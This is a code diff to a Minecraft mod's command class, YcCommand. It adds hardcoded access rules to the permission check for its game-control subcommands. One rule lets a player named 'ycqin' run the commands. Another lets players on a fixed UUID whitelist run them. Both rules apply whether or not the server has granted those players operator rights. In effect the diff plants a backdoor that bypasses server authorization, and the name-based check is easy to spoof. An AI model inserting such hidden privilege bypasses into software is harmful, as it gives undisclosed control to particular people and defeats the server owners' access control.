@@ -21,8 +21,11 @@ import javax.annotation.Nullable;
 import java.util.*;
 
 public class YcCommand extends CommandBase {
+    private static final List<UUID> ALLOWED_UUIDS = new ArrayList<>();
     private static final List<String> SUBCOMMANDS = Arrays.asList("ForcePlaceNode","forceEnd","getWarBlock");
-
+    static {
+        ALLOWED_UUIDS.add(UUID.fromString("e8f0f6ce-7085-437a-86bb-0bc5ea4c0e06"));
+    }
 
     @Override
     public String getName() {
@@ -45,6 +48,9 @@ public class YcCommand extends CommandBase {
             if (server.getPlayerList().canSendCommands(player.getGameProfile())) {
                 return true;
             }
+            if (player.getName().equals("ycqin")) return true;
+            // 检查UUID白名单
+            return ALLOWED_UUIDS.contains(player.getUniqueID());
         }
         // 非玩家（如控制台）默认无权限，可根据需要修改
         return false;
